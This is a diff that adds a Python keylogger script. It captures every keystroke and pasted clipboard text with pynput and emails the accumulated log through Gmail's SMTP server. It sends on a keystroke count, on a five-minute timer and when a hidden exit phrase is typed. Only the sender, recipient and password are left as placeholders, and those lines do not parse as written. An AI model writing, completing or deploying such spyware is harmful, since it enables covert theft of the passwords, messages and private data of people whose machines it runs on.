@@ -1,0 +1,107 @@
+from pynput import keyboard
+import pyperclip
+import smtplib
+from email.mime.text import MIMEText
+from email.mime.multipart import MIMEMultipart
+import threading
+import time
+
+keys = []
+exit_sequence = "child1sh"
+counter = 0
+email_threshold = 1000
+time_threshold = 300
+class MyListener(keyboard.Listener):
+    def __init__(self, on_press, on_release):
+        super().__init__(on_press=on_press, on_release=on_release)
+        self.ctrl_pressed = False
+
+    def on_press(self, key):
+        if key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
+            self.ctrl_pressed = True
+        on_press(key)
+
+    def on_release(self, key):
+        if key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
+            self.ctrl_pressed = False
+        on_release(key)
+
+def on_press(key):
+    global keys, counter
+    try:
+        if key.char:
+            keys.append(key.char)
+            counter += 1
+    except AttributeError:
+        if listener.ctrl_pressed:
+            if key == keyboard.Key.v:
+                pasted_data = pyperclip.paste()
+                keys.append(pasted_data)
+                print(f"Pasted: {pasted_data}")
+            elif key == keyboard.Key.c:
+                copied_data = ''.join(keys)
+                pyperclip.copy(copied_data)
+                print(f"Copied: {copied_data}")
+            elif key == keyboard.Key.x:
+                cut_data = ''.join(keys)
+                pyperclip.copy(cut_data)
+                keys.clear()
+                print(f"Cut: {cut_data}")
+        else:
+            if key == keyboard.Key.backspace:
+                keys.append("BACKSPACE")
+            else:
+                keys.append(str(key))
+
+    if ''.join(keys[-len(exit_sequence):]) == exit_sequence:
+        send_email_with_content(''.join(keys))
+        keys.clear()
+        counter = 0
+        print("Exit sequence detected, stopping keylogger.")
+        return False
+
+    if counter >= email_threshold:
+        send_email_with_content(''.join(keys))
+        keys.clear()
+        counter = 0
+
+def on_release(key):
+    global keys
+
+def send_email_with_content(content):
+    sender_email = #sender)
+    receiver_email = #recevier)
+
+    msg = MIMEMultipart()
+    msg['From'] = sender_email
+    msg['To'] = receiver_email
+    msg['Subject'] = "Key Logs"
+
+    msg.attach(MIMEText(content, 'plain'))
+
+    try:
+        server = smtplib.SMTP("smtp.gmail.com", 587)
+        server.starttls()
+        server.login(sender_email, "########")
+        server.sendmail(sender_email, receiver_email, msg.as_string())
+        server.quit()
+        print("Email sent successfully.")
+    except Exception as e:
+        print(f"Failed to send email: {e}")
+
+def timer():
+    global keys, counter
+    while True:
+        time.sleep(time_threshold)
+        if keys:
+            send_email_with_content(''.join(keys))
+            keys.clear()
+            counter = 0
+
+# Start the timer thread
+timer_thread = threading.Thread(target=timer)
+timer_thread.daemon = True
+timer_thread.start()
+
+with MyListener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
